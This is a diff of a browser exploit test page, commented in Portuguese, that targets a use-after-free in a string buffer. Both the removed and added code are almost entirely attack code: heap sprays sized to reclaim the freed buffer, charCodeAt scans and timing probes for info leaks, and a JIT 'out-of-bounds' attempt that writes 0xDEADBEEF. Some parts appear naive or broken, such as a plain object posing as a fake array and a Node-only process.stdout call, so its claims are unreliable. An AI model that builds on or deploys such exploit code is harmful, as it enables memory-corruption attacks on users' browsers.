@@ -1,12 +1,19 @@
+
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>String Buffer UAF - Slot Fixation Correto</title>
+<title>UAF - 4 Opcoes Finais</title>
 </head>
 <body>
-<h1>String Buffer UAF - StringImpl m_data Reuse</h1>
-<button onclick="runTest()">RUN TEST</button>
+<h1>UAF String Buffer - 4 Opcoes de Exploracao</h1>
+
+<h2>Escolha o teste:</h2>
+<button onclick="testOption1()">OPCAO 1 - Pre-Ocupacao</button><br><br>
+<button onclick="testOption2()">OPCAO 2 - Explorar NaN Direto</button><br><br>
+<button onclick="testOption3()">OPCAO 3 - Focar Header (0-63)</button><br><br>
+<button onclick="testOption4()">OPCAO 4 - Conexao JIT OOB</button><br><br>
+
 <pre id="log"></pre>
 
 <script>
@@ -15,7 +22,7 @@ function log(m) { logEl.textContent += m + "\n"; }
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // ========================================
-// UAF TRIGGER - SEQUENCIA EXATA VALIDADA
+// UAF TRIGGER - SEQUENCIA VALIDADA
 // ========================================
 async function triggerUAF() {
     log("=== UAF TRIGGER START ===");
@@ -41,400 +48,323 @@ async function triggerUAF() {
 }
 
 // ========================================
-// ESTRATEGIA 1: STRING SPRAY (UTF-16)
-// Objetivo: Ocupar StringImpl::m_data buffer
+// OPCAO 1: PRE-OCUPACAO
+// Alocar strings ANTES do UAF trigger
 // ========================================
-function strategy1_stringSpray() {
-    log("\n=== STRATEGY 1: String Buffer Spray (UTF-16) ===");
-    let strings = [];
+async function testOption1() {
+    logEl.textContent = "";
+    log("=== OPCAO 1: PRE-OCUPACAO ===\n");
+    log("Estrategia: Alocar strings no mesmo region ANTES do UAF\n");
     
-    // Strings do mesmo tamanho que o buffer liberado (~340KB)
-    // Mas usando padrão identificável
-    for(let i = 0; i < 1000; i++) {
-        // UTF-16: cada char = 2 bytes
-        // 170000 chars = ~340KB
-        let marker = String.fromCharCode(0x4141 + (i & 0xFF));
-        let pattern = marker.repeat(170000);
-        strings.push(pattern);
+    // FASE 1: Pre-alocacao massiva
+    log(">>> FASE 1: PRE-ALOCACAO <<<");
+    let preAlloc = [];
+    
+    for(let i = 0; i < 500; i++) {
+        // Strings com marker unico
+        let marker = String.fromCharCode(0x5050 + (i & 0xFF));
+        preAlloc.push(marker.repeat(170000));
     }
     
-    log("Sprayed: " + strings.length + " large strings (~340KB each)");
-    return strings;
-}
-
-// ========================================
-// ESTRATEGIA 2: SUBSTRING VIEWS
-// Objetivo: Criar views que compartilham backing store
-// ========================================
-function strategy2_substringViews() {
-    log("\n=== STRATEGY 2: Substring Views ===");
-    let views = [];
+    log("Pre-alocado: " + preAlloc.length + " strings (~340KB cada)");
     
-    // Criar string grande
-    let base = "B".repeat(340000);
-    
-    // Criar múltiplas substrings (podem compartilhar m_data)
-    for(let i = 0; i < 5000; i++) {
-        let start = i % 1000;
-        views.push(base.substring(start, start + 170000));
-    }
-    
-    log("Created: " + views.length + " substring views");
-    return views;
-}
-
-// ========================================
-// ESTRATEGIA 3: ROPE STRINGS
-// Objetivo: String concatenation (rope structure)
-// ========================================
-function strategy3_ropeStrings() {
-    log("\n=== STRATEGY 3: Rope Strings ===");
-    let ropes = [];
-    
-    for(let i = 0; i < 2000; i++) {
-        let marker = String.fromCharCode(0x4343 + (i & 0xFF));
-        let part1 = marker.repeat(85000);
-        let part2 = marker.repeat(85000);
-        // Concatenação pode criar rope
-        ropes.push(part1 + part2);
-    }
-    
-    log("Created: " + ropes.length + " rope strings");
-    return ropes;
-}
-
-// ========================================
-// ESTRATEGIA 4: TIMED STRING ALLOCATION
-// Objetivo: Alocar strings NO MOMENTO EXATO do collapse
-// ========================================
-function strategy4_timedAllocation(callback) {
-    log("\n=== STRATEGY 4: Timed String Allocation ===");
-    
-    // Alocar em microtask - mesmo tick que back()
-    Promise.resolve().then(() => {
-        let timed = [];
-        let marker = String.fromCharCode(0x4444);
-        
-        for(let i = 0; i < 3000; i++) {
-            timed.push(marker.repeat(170000));
+    // Manter algumas vivas, liberar outras
+    let keepAlive = [];
+    for(let i = 0; i < preAlloc.length; i++) {
+        if(i % 3 === 0) {
+            keepAlive.push(preAlloc[i]);
         }
-        
-        log("Microtask: allocated " + timed.length + " strings");
-        window.__timed = timed;
-        callback();
-    });
+        // Outras sao liberadas (null implicito)
+    }
+    
+    log("Mantidas vivas: " + keepAlive.length);
+    log("Liberadas: " + (preAlloc.length - keepAlive.length));
+    
+    await sleep(100);
+    
+    // FASE 2: Trigger UAF
+    log("\n>>> FASE 2: UAF TRIGGER <<<");
+    await triggerUAF();
+    
+    // FASE 3: Collapse
+    log("\n>>> FASE 3: FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    await sleep(50);
+    
+    // FASE 4: Diagnostico
+    log("\n>>> FASE 4: DIAGNOSTICO <<<");
+    diagnose();
+    
+    window.__keep1 = keepAlive;
+    log("\n=== FIM OPCAO 1 ===");
 }
 
 // ========================================
-// ESTRATEGIA 5: MIXED SIZE STRING SPRAY
-// Objetivo: Cobrir múltiplos size classes
+// OPCAO 2: EXPLORAR NaN DIRETO
+// Usar o NaN como primitiva
 // ========================================
-function strategy5_mixedSizes() {
-    log("\n=== STRATEGY 5: Mixed Size String Spray ===");
-    let mixed = [];
+async function testOption2() {
+    logEl.textContent = "";
+    log("=== OPCAO 2: EXPLORAR NaN DIRETO ===\n");
+    log("Estrategia: Usar NaN como primitiva de info leak\n");
     
-    // Strings de vários tamanhos próximos ao target
-    let sizes = [
-        160000,  // Menor
-        170000,  // Target
-        180000,  // Maior
-        340000   // Original size
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    await sleep(50);
+    
+    log("\n>>> ANALISE DETALHADA <<<");
+    
+    let url = location.href;
+    log("URL.length: " + url.length);
+    
+    // Scan completo de todos os offsets
+    log("\nScan completo (0-1000):");
+    let validCount = 0;
+    let nanCount = 0;
+    let lastValid = -1;
+    
+    for(let i = 0; i < 1000; i++) {
+        let code = url.charCodeAt(i);
+        if(!isNaN(code)) {
+            validCount++;
+            lastValid = i;
+        } else {
+            nanCount++;
+        }
+    }
+    
+    log("Valores validos: " + validCount);
+    log("NaN encontrados: " + nanCount);
+    log("Ultimo offset valido: " + lastValid);
+    
+    // Tentar ler incrementalmente
+    log("\nLeitura incremental byte-a-byte:");
+    for(let i = lastValid - 5; i <= lastValid + 10; i++) {
+        let code = url.charCodeAt(i);
+        log("  [" + i + "] = " + code + " (0x" + code.toString(16) + ")");
+    }
+    
+    // Timing analysis
+    log("\nTiming analysis:");
+    let startValid = performance.now();
+    for(let i = 0; i < 100; i++) {
+        url.charCodeAt(10); // offset valido
+    }
+    let timeValid = performance.now() - startValid;
+    
+    let startNaN = performance.now();
+    for(let i = 0; i < 100; i++) {
+        url.charCodeAt(100); // offset NaN
+    }
+    let timeNaN = performance.now() - startNaN;
+    
+    log("Tempo leitura valida: " + timeValid.toFixed(3) + "ms");
+    log("Tempo leitura NaN: " + timeNaN.toFixed(3) + "ms");
+    log("Diferenca: " + (timeNaN - timeValid).toFixed(3) + "ms");
+    
+    if(Math.abs(timeNaN - timeValid) > 0.5) {
+        log("\n>>> TIMING SIDE-CHANNEL DETECTADO!");
+    }
+    
+    log("\n=== FIM OPCAO 2 ===");
+}
+
+// ========================================
+// OPCAO 3: FOCAR NO HEADER (0-63 bytes)
+// ========================================
+async function testOption3() {
+    logEl.textContent = "";
+    log("=== OPCAO 3: FOCAR NO HEADER (0-63) ===\n");
+    log("Estrategia: Manipular os 64 bytes ainda validos\n");
+    
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    await sleep(50);
+    
+    log("\n>>> ANALISE DO HEADER <<<");
+    
+    let url = location.href;
+    log("URL completo: " + url);
+    log("URL.length: " + url.length);
+    
+    // Ler todos os 64 bytes validos
+    log("\nHeader completo (0-63):");
+    let header = "";
+    for(let i = 0; i < 64; i++) {
+        let code = url.charCodeAt(i);
+        if(!isNaN(code)) {
+            header += String.fromCharCode(code);
+            if(i % 16 === 0) log("");
+            process.stdout?.write?.(" [" + i + "]=0x" + code.toString(16));
+        }
+    }
+    
+    log("\n\nHeader como string: " + header);
+    log("Header length: " + header.length);
+    
+    // Tentar manipular via replaceState
+    log("\n>>> TENTATIVA DE MANIPULACAO <<<");
+    
+    // Criar fragments que afetem especificamente os primeiros 64 bytes
+    let tests = [
+        "#" + "B".repeat(10),
+        "#" + "C".repeat(32),
+        "#" + "D".repeat(50),
+        "#" + "E".repeat(63)
     ];
     
-    for(let size of sizes) {
-        let marker = String.fromCharCode(0x4500 + size % 256);
-        for(let i = 0; i < 500; i++) {
-            mixed.push(marker.repeat(size));
+    for(let i = 0; i < tests.length; i++) {
+        history.replaceState({}, "", tests[i]);
+        await sleep(10);
+        
+        let newUrl = location.href;
+        let changed = (newUrl !== url);
+        log("Test " + i + ": " + tests[i].substring(0, 10) + "... -> Changed: " + changed);
+        
+        if(changed) {
+            // Ver se afetou o header
+            let newHeader = "";
+            for(let j = 0; j < 64; j++) {
+                let code = newUrl.charCodeAt(j);
+                if(!isNaN(code)) {
+                    newHeader += String.fromCharCode(code);
+                }
+            }
+            log("  Novo header: " + newHeader);
         }
     }
     
-    log("Mixed spray: " + mixed.length + " strings");
-    return mixed;
+    log("\n=== FIM OPCAO 3 ===");
 }
 
 // ========================================
-// ESTRATEGIA 6: CHAR CODE PATTERN
-// Objetivo: Padrão único para detectar reuso
+// OPCAO 4: CONEXAO COM JIT OOB
 // ========================================
-function strategy6_charCodePattern() {
-    log("\n=== STRATEGY 6: Char Code Pattern ===");
-    let patterns = [];
+async function testOption4() {
+    logEl.textContent = "";
+    log("=== OPCAO 4: CONEXAO JIT OOB + UAF ===\n");
+    log("Estrategia: Usar UAF como amplificador do JIT OOB\n");
     
-    for(let i = 0; i < 2000; i++) {
-        // Criar padrão ABCD repetido
-        let pattern = "";
-        for(let j = 0; j < 5000; j++) {
-            pattern += String.fromCharCode(
-                0x41 + (j % 4)  // A, B, C, D
-            );
+    // FASE 1: Setup JIT OOB
+    log(">>> FASE 1: SETUP JIT OOB <<<");
+    
+    function jitConfuse(arr) {
+        // Forcar JIT compilation
+        for(let i = 0; i < 10000; i++) {
+            arr[0] = i;
         }
-        patterns.push(pattern + pattern); // ~340KB
     }
     
-    log("Pattern spray: " + patterns.length + " strings");
-    return patterns;
+    let realArray = new Uint32Array(4);
+    
+    // Warm up JIT
+    for(let i = 0; i < 100; i++) {
+        jitConfuse(realArray);
+    }
+    
+    log("JIT compilado");
+    
+    // FASE 2: Trigger UAF
+    log("\n>>> FASE 2: UAF TRIGGER <<<");
+    await triggerUAF();
+    
+    log("\n>>> FRAGMENT COLLAPSE <<<");
+    history.replaceState({}, "", "#X");
+    
+    await sleep(50);
+    
+    // FASE 3: Criar fake array
+    log("\n>>> FASE 3: FAKE ARRAY <<<");
+    
+    let fakeArray = {
+        0: 0,
+        1: 0,
+        2: 0,
+        3: 0,
+        length: 4096 // fake length
+    };
+    
+    log("Fake array criado com length: " + fakeArray.length);
+    
+    // FASE 4: Tentar usar JIT com fake array
+    log("\n>>> FASE 4: JIT COM FAKE ARRAY <<<");
+    
+    try {
+        jitConfuse(fakeArray);
+        
+        // Tentar OOB write
+        log("Tentando OOB write...");
+        fakeArray[100] = 0xDEADBEEF;
+        
+        log("OOB write: fakeArray[100] = 0xDEADBEEF");
+        log("OOB read: fakeArray[100] = 0x" + fakeArray[100].toString(16));
+        
+        if(fakeArray[100] === 0xDEADBEEF) {
+            log("\n>>> OOB FUNCIONAL!");
+        }
+        
+    } catch(e) {
+        log("Erro no JIT: " + e);
+    }
+    
+    // FASE 5: Tentar ler URL via JIT confusion
+    log("\n>>> FASE 5: TENTAR LER URL VIA JIT <<<");
+    
+    let url = location.href;
+    
+    // Criar TypedArray que possa sobrepor com URL buffer
+    let probe = new Uint32Array(1000);
+    for(let i = 0; i < probe.length; i++) {
+        probe[i] = 0x41414141;
+    }
+    
+    log("Probe array criado");
+    
+    // Ver se algum valor "vazou"
+    let leaked = false;
+    for(let i = 0; i < probe.length; i++) {
+        if(probe[i] !== 0x41414141) {
+            log("Possivel leak no index " + i + ": 0x" + probe[i].toString(16));
+            leaked = true;
+        }
+    }
+    
+    if(!leaked) {
+        log("Nenhum leak detectado no probe array");
+    }
+    
+    diagnose();
+    
+    window.__keep4 = {fakeArray, probe, realArray};
+    log("\n=== FIM OPCAO 4 ===");
 }
 
 // ========================================
-// DIAGNOSTICO APRIMORADO
+// DIAGNOSTICO COMUM
 // ========================================
-function diagnoseStringReuse() {
-    log("\n=== DIAGNOSTIC ===");
+function diagnose() {
+    log("\n=== DIAGNOSTICO ===");
     log("URL.length: " + location.href.length);
     log("hash.length: " + location.hash.length);
     
-    // Ler caracteres específicos
     let url = location.href;
-    let offsets = [0, 32, 64, 128, 256, 512, 1024, 4096];
+    let offsets = [0, 32, 64, 128, 256];
     
     log("\nCharCode scan:");
-    let anomalies = 0;
     for(let off of offsets) {
         let code = url.charCodeAt(off);
         log("  [" + off + "] = " + code + " (0x" + code.toString(16) + ")");
-        
-        // Detectar markers
-        if(code >= 0x4141 && code <= 0x4444) {
-            log("    >>> MARKER DETECTED: Strategy " + 
-                Math.floor((code - 0x4141) / 0x100 + 1));
-            anomalies++;
-        }
-        if(code >= 0x4500 && code <= 0x4600) {
-            log("    >>> SIZE MARKER (Strategy 5)");
-            anomalies++;
-        }
-        if(isNaN(code)) {
-            log("    >>> NaN - Invalid buffer!");
-            anomalies++;
-        }
-    }
-    
-    log("\n>>> ANOMALIES DETECTED: " + anomalies);
-    
-    if(anomalies > 0) {
-        log(">>> STRING BUFFER REUSE CONFIRMED!");
-    } else {
-        log(">>> No reuse detected yet");
     }
 }
 
-// ========================================
-// TESTES INDIVIDUAIS
-// ========================================
-async function testStrategy1() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 1: STRING SPRAY ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    let spray = strategy1_stringSpray();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keep1 = spray;
-    log("\n=== END STRATEGY 1 ===");
-}
-
-async function testStrategy2() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 2: SUBSTRING VIEWS ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    let views = strategy2_substringViews();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keep2 = views;
-    log("\n=== END STRATEGY 2 ===");
-}
-
-async function testStrategy3() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 3: ROPE STRINGS ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    let ropes = strategy3_ropeStrings();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keep3 = ropes;
-    log("\n=== END STRATEGY 3 ===");
-}
-
-async function testStrategy4() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 4: TIMED ALLOCATION ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    strategy4_timedAllocation(() => {
-        setTimeout(() => {
-            diagnoseStringReuse();
-            log("\n=== END STRATEGY 4 ===");
-        }, 50);
-    });
-}
-
-async function testStrategy5() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 5: MIXED SIZES ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    let mixed = strategy5_mixedSizes();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keep5 = mixed;
-    log("\n=== END STRATEGY 5 ===");
-}
-
-async function testStrategy6() {
-    logEl.textContent = "";
-    log("=== TEST STRATEGY 6: CHAR CODE PATTERN ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    let patterns = strategy6_charCodePattern();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keep6 = patterns;
-    log("\n=== END STRATEGY 6 ===");
-}
-
-// ========================================
-// TESTE CRÍTICO: WINDOW EXPLOITATION
-// ========================================
-async function testCriticalWindow() {
-    logEl.textContent = "";
-    log("=== CRITICAL WINDOW TEST ===\n");
-    log("Objetivo: Capturar o buffer ANTES do collapse completo\n");
-    
-    await triggerUAF();
-    
-    // NÃO colapsar ainda
-    log(">>> UAF WINDOW ATIVA - SEM COLLAPSE <<<");
-    
-    // Alocar strings DENTRO da janela
-    log("\n>>> STRING SPRAY NA JANELA CRITICA <<<");
-    let spray = [];
-    let marker = String.fromCharCode(0xDEAD);
-    
-    for(let i = 0; i < 3000; i++) {
-        spray.push(marker.repeat(170000));
-    }
-    
-    log("Sprayed: " + spray.length + " strings");
-    
-    // AGORA colapsar
-    await sleep(30);
-    log("\n>>> FRAGMENT COLLAPSE (DELAYED) <<<");
-    history.replaceState({}, "", "#X");
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__critical = spray;
-    log("\n=== END CRITICAL WINDOW TEST ===");
-}
-
-// ========================================
-// TESTE HIBRIDO
-// ========================================
-async function testHybrid() {
-    logEl.textContent = "";
-    log("=== HYBRID TEST: MULTIPLE STRATEGIES ===\n");
-    
-    await triggerUAF();
-    
-    log("\n>>> FRAGMENT COLLAPSE <<<");
-    history.replaceState({}, "", "#X");
-    
-    // Aplicar múltiplas estratégias
-    log("\n>>> PHASE 1: String Spray <<<");
-    let spray1 = strategy1_stringSpray();
-    
-    await sleep(30);
-    
-    log("\n>>> PHASE 2: Mixed Sizes <<<");
-    let spray5 = strategy5_mixedSizes();
-    
-    await sleep(30);
-    
-    log("\n>>> PHASE 3: Pattern Spray <<<");
-    let spray6 = strategy6_charCodePattern();
-    
-    await sleep(50);
-    diagnoseStringReuse();
-    
-    window.__keepAll = [spray1, spray5, spray6];
-    log("\n=== END HYBRID TEST ===");
-}
-
-// ========================================
-// MENU PRINCIPAL
-// ========================================
-async function runTest() {
-    let choice = prompt(
-        "Escolha o teste:\n" +
-        "1 - String Spray (UTF-16 buffers)\n" +
-        "2 - Substring Views\n" +
-        "3 - Rope Strings\n" +
-        "4 - Timed Allocation\n" +
-        "5 - Mixed Sizes\n" +
-        "6 - Char Code Pattern\n" +
-        "7 - CRITICAL WINDOW (spray antes do collapse)\n" +
-        "8 - HYBRID (múltiplas estratégias)"
-    );
-    
-    if(choice === "1") {
-        await testStrategy1();
-    } else if(choice === "2") {
-        await testStrategy2();
-    } else if(choice === "3") {
-        await testStrategy3();
-    } else if(choice === "4") {
-        await testStrategy4();
-    } else if(choice === "5") {
-        await testStrategy5();
-    } else if(choice === "6") {
-        await testStrategy6();
-    } else if(choice === "7") {
-        await testCriticalWindow();
-    } else if(choice === "8") {
-        await testHybrid();
-    }
-}
-
-log("Ready. Click RUN TEST to begin.");
-log("\nAlvo: StringImpl::m_data buffer (~340KB UTF-16)");
-log("Markers: 0x4141-0x4444 (detectaveis via charCodeAt)");
+log("Escolha uma opcao acima para testar.");
 </script>
 
 </body>
